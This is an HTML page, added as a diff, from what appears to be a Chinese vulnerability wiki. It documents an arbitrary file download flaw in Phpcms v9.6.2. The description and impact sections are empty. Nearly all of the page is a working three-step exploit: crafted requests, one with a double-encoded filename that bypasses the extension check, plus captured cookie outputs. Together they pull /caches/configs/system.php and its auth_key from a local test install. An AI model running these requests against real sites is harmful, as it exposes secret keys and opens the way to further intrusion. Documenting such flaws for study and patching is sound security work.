@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Phpcms/Phpcms%20v9.6.2%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Phpcms v9.6.2 任意文件下载 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Phpcms v9.6.2 \u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Phpcms%20v9.6.2%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Phpcms%20v9.6.2%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        Phpcms v9.6.2 前台sql注入
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Phpcms%20v9.6.1%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Phpcms%20v9.6.1%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-link">
+        Phpcms v9.6.1 任意文件读取
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="phpcms-v962">Phpcms v9.6.2 任意文件下载<a class="headerlink" href="#phpcms-v962" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h5 id="ydvib_siteid">第一步:进行如下请求获得YDVIB_siteid的值。<a class="headerlink" href="#ydvib_siteid" title="Permanent link">&para;</a></h5>
+<p>请求：</p>
+<div class="codehilite"><pre><span></span><code><span class="o">[</span><span class="n">GET</span><span class="o">]</span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0.0.1</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">phpcms_v9</span><span class="mf">.6.2</span><span class="n">_UTF8</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="vm">?</span><span class="n">m</span><span class="o">=</span><span class="n">wap</span><span class="o">&amp;</span><span class="n">c</span><span class="o">=</span><span class="k">index</span><span class="o">&amp;</span><span class="n">a</span><span class="o">=</span><span class="n">init</span><span class="o">&amp;</span><span class="n">siteid</span><span class="o">=</span><span class="mi">1</span>
+</code></pre></div>
+
+<p>获得：</p>
+<div class="codehilite"><pre><span></span><code><span class="o">[</span><span class="n">cookie</span><span class="o">]</span><span class="nl">YDVIB_siteid</span><span class="p">:</span><span class="mi">75</span><span class="n">d1XCnlbSh</span><span class="o">-</span><span class="mi">1</span><span class="n">zi2xZ</span><span class="o">-</span><span class="n">gearAbSsmOcXypuSKXZst</span>
+</code></pre></div>
+
+<h5 id="post-data-userid_flashydvib_siteid">第二步:在[POST DATA] 中的userid_flash参数的值设置为，第一步请求得到的YDVIB_siteid参数的值，并进行如下请求。<a class="headerlink" href="#post-data-userid_flashydvib_siteid" title="Permanent link">&para;</a></h5>
+<p>请求：</p>
+<div class="codehilite"><pre><span></span><code><span class="p">[</span><span class="n">GET</span><span class="p">]</span><span class="w"> </span><span class="n">http</span><span class="o">:</span><span class="c1">//127.0.0.1/code/phpcms_v9.6.2_UTF8/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;src=a%26i=1%26m=1%26catid=1%26f=./caches/configs/system.ph%253ep%2581%26modelid=1%26d=1&amp;aid=1</span>
+
+<span class="p">[</span><span class="n">POST</span><span class="w"> </span><span class="n">DATA</span><span class="p">]</span><span class="w"> </span><span class="n">userid_flash</span><span class="o">=</span><span class="mi">75</span><span class="n">d1XCnlbSh</span><span class="mi">-1</span><span class="n">zi2xZ</span><span class="o">-</span><span class="n">gearAbSsmOcXypuSKXZst</span>
+</code></pre></div>
+
+<p>获得：</p>
+<div class="codehilite"><pre><span></span><code><span class="o">[</span><span class="n">cookie</span><span class="o">]</span><span class="w"> </span><span class="nl">YDVIB_att_json</span><span class="p">:</span><span class="n">ea6fUlmiupVPoK2udMAztI7dpqUURRW1plemEGmRhGPocAvwWbcMk3BARFHzxLI4NJrV1IJQ2PaHeec790iDdhRJ9dJbhEKamgM55SwKR</span><span class="o">-</span><span class="n">F3fFmmWDOVuHnyiWg9kyMzQ2l9D_cRPQmM7P9e7ZYrESNQwjMOytrFTIhY4SFmK2Vjc3GS3g</span>
+</code></pre></div>
+
+<h5 id="geta_kydvib_att_json">第三步:将GET请求中的a_k参数的值设置为第二步请求获得的YDVIB_att_json参数的值，并进行如下请求。<a class="headerlink" href="#geta_kydvib_att_json" title="Permanent link">&para;</a></h5>
+<p>请求：</p>
+<div class="codehilite"><pre><span></span><code><span class="o">[</span><span class="n">get</span><span class="o">]</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0.0.1</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">phpcms_v9</span><span class="mf">.6.2</span><span class="n">_UTF8</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="vm">?</span><span class="n">m</span><span class="o">=</span><span class="n">content</span><span class="o">&amp;</span><span class="n">c</span><span class="o">=</span><span class="n">down</span><span class="o">&amp;</span><span class="n">a</span><span class="o">=</span><span class="n">init</span><span class="o">&amp;</span><span class="n">a_k</span><span class="o">=</span><span class="mi">41</span><span class="n">f4VsAhLvN8</span><span class="o">-</span><span class="mi">4</span><span class="n">L1ntgSsuga4BrvYA5zcDo2bjiYB7RI98Qzj5D5k8dqqBfo7cUNwF3TGhz1SH</span><span class="o">-</span><span class="n">vPs3lIIQJYwHeF_u2b3QVfD2HIO3Gay68TAtz2rqYhX8XIeznWrTtOI24418KZUoTEAfnY4kZNtIajW</span><span class="o">-</span><span class="n">bqHRV1djqmEc1hSAwkIYWA9CPrw</span>
+</code></pre></div>
+
+<p>获得：</p>
+<div class="codehilite"><pre><span></span><code><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">phpcms_v9</span><span class="o">.</span><span class="mf">6.2</span><span class="n">_UTF8</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">m</span><span class="o">=</span><span class="n">content</span><span class="o">&amp;</span><span class="n">c</span><span class="o">=</span><span class="n">down</span><span class="o">&amp;</span><span class="n">a</span><span class="o">=</span><span class="n">download</span><span class="o">&amp;</span><span class="n">a_k</span><span class="o">=</span><span class="mf">7e9</span><span class="n">d9SFk0jOteAemg</span><span class="o">-</span><span class="n">j7IVn6Ph1JFU9FEkyDo9xeasNJDPgZsOhusc39D4KiHzydJwt2B4iLuu</span><span class="o">-</span><span class="n">l9w03UV47obM9nsnjcJxi2jbawvqfZWcY9PeL3j0MgKxAvgXL4</span><span class="o">-</span><span class="n">dbf8gGG6_EJXIOA2p9Jkl9QcM</span>
+</code></pre></div>
+
+<h5 id="cachesconfigssystemphpauth_key">最后点击"点击下载"的按钮进行如下请求，便可以下载/caches/configs/system.php文件，得到里面的'auth_key'<a class="headerlink" href="#cachesconfigssystemphpauth_key" title="Permanent link">&para;</a></h5>
+<div class="codehilite"><pre><span></span><code><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">phpcms_v9</span><span class="o">.</span><span class="mf">6.2</span><span class="n">_UTF8</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">m</span><span class="o">=</span><span class="n">content</span><span class="o">&amp;</span><span class="n">c</span><span class="o">=</span><span class="n">down</span><span class="o">&amp;</span><span class="n">a</span><span class="o">=</span><span class="n">download</span><span class="o">&amp;</span><span class="n">a_k</span><span class="o">=</span><span class="mf">7e9</span><span class="n">d9SFk0jOteAemg</span><span class="o">-</span><span class="n">j7IVn6Ph1JFU9FEkyDo9xeasNJDPgZsOhusc39D4KiHzydJwt2B4iLuu</span><span class="o">-</span><span class="n">l9w03UV47obM9nsnjcJxi2jbawvqfZWcY9PeL3j0MgKxAvgXL4</span><span class="o">-</span><span class="n">dbf8gGG6_EJXIOA2p9Jkl9QcM</span>
+</code></pre></div>
+
+<p><img alt="" src="../resource/Phpcmsv9.6.2%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/media/rId28.png" /></p>
+<h2 id="_4">参考链接<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://www.freebuf.com/column/158352.html">https://www.freebuf.com/column/158352.html</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Phpcms%20v9.6.2%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Phpcms%20v9.6.2%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        Phpcms v9.6.2 前台sql注入
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Phpcms%20v9.6.1%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Phpcms%20v9.6.1%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-link">
+        Phpcms v9.6.1 任意文件读取
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
